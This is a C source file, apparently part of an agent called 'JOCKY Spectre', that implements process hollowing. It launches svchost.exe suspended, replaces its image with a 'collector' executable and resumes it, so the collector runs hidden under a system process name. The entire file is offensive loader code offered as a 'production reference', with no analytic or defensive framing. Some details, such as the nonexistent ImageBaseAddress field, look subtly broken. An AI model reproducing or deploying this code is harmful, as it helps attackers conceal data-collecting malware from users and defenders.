/*
 * JOCKY Spectre Agent — Process Hollowing
 * Technique: Create suspended svchost.exe, unmap image, write collector PE,
 *            patch thread context, resume. Zero new processes visible.
 *
 * Production reference. Compiled with: cl /O2 /GS- hollow.c /link ntdll.lib
 */

#include <windows.h>
#include <winternl.h>
#include "syscalls.h"

typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

typedef struct _HOLLOW_CTX {
    HANDLE hProcess;
    HANDLE hThread;
    PVOID  remoteBase;
    PVOID  entryPoint;
    DWORD  pid;
} HOLLOW_CTX;

static BOOL hollow_map_pe(HOLLOW_CTX *ctx, LPVOID collectorPE, DWORD peSize) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)collectorPE;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((BYTE*)collectorPE + dos->e_lfanew);

    PVOID preferredBase = (PVOID)nt->OptionalHeader.ImageBaseAddress;
    SIZE_T imageSize    = nt->OptionalHeader.SizeOfImage;

    /* Step 4: Unmap original image from suspended process */
    pNtUnmapViewOfSection NtUnmap = (pNtUnmapViewOfSection)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
    NtUnmap(ctx->hProcess, preferredBase);

    /* Step 5: Allocate at preferred base */
    ctx->remoteBase = VirtualAllocEx(
        ctx->hProcess, preferredBase, imageSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    );
    if (!ctx->remoteBase) return FALSE;

    /* Step 6: Write PE headers */
    WriteProcessMemory(ctx->hProcess, ctx->remoteBase,
                       collectorPE, nt->OptionalHeader.SizeOfHeaders, NULL);

    /* Write each section */
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(
            ctx->hProcess,
            (BYTE*)ctx->remoteBase + section[i].VirtualAddress,
            (BYTE*)collectorPE + section[i].PointerToRawData,
            section[i].SizeOfRawData,
            NULL
        );
    }

    /* Step 7: Apply relocations if base changed */
    if (ctx->remoteBase != preferredBase) {
        DWORD delta = (DWORD)((ULONG_PTR)ctx->remoteBase - (ULONG_PTR)preferredBase);
        PIMAGE_DATA_DIRECTORY relocDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir->Size) {
            PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)
                ((BYTE*)collectorPE + relocDir->VirtualAddress);
            while (reloc->VirtualAddress) {
                DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                PWORD entries = (PWORD)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION));
                for (DWORD j = 0; j < count; j++) {
                    if ((entries[j] >> 12) == IMAGE_REL_BASED_DIR64) {
                        ULONG_PTR *patch = (ULONG_PTR*)((BYTE*)ctx->remoteBase +
                            reloc->VirtualAddress + (entries[j] & 0xFFF));
                        ULONG_PTR val;
                        ReadProcessMemory(ctx->hProcess, patch, &val, sizeof(val), NULL);
                        val += delta;
                        WriteProcessMemory(ctx->hProcess, patch, &val, sizeof(val), NULL);
                    }
                }
                reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)reloc + reloc->SizeOfBlock);
            }
        }
    }

    ctx->entryPoint = (PVOID)((ULONG_PTR)ctx->remoteBase +
                              nt->OptionalHeader.AddressOfEntryPoint);
    return TRUE;
}

BOOL hollow_execute(LPVOID collectorPE, DWORD peSize) {
    HOLLOW_CTX ctx = {0};

    /* Step 1: Create svchost.exe in SUSPENDED state */
    STARTUPINFOA si = { .cb = sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    if (!CreateProcessA(
            "C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL,
            FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
        return FALSE;

    ctx.hProcess = pi.hProcess;
    ctx.hThread  = pi.hThread;
    ctx.pid      = pi.dwProcessId;

    /* Step 2-3: Query remote PEB to find image base */
    PROCESS_BASIC_INFORMATION pbi;
    pNtQueryInformationProcess NtQIP = (pNtQueryInformationProcess)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
    NtQIP(ctx.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);

    PVOID remoteImageBase;
    ReadProcessMemory(ctx.hProcess,
        (BYTE*)pbi.PebBaseAddress + offsetof(PEB, Reserved3[1]),
        &remoteImageBase, sizeof(remoteImageBase), NULL);

    /* Steps 4-7: Unmap, allocate, write, relocate */
    if (!hollow_map_pe(&ctx, collectorPE, peSize)) {
        TerminateProcess(ctx.hProcess, 1);
        return FALSE;
    }

    /* Step 8: Patch PEB.ImageBaseAddress */
    WriteProcessMemory(ctx.hProcess,
        (BYTE*)pbi.PebBaseAddress + offsetof(PEB, Reserved3[1]),
        &ctx.remoteBase, sizeof(ctx.remoteBase), NULL);

    /* Step 9: Set thread context — RCX points to entry */
    CONTEXT threadCtx = { .ContextFlags = CONTEXT_FULL };
    GetThreadContext(ctx.hThread, &threadCtx);
    threadCtx.Rcx = (DWORD64)ctx.entryPoint;
    SetThreadContext(ctx.hThread, &threadCtx);

    /* Step 10: Resume — collector runs as svchost.exe */
    ResumeThread(ctx.hThread);

    CloseHandle(ctx.hThread);
    CloseHandle(ctx.hProcess);
    return TRUE;
}
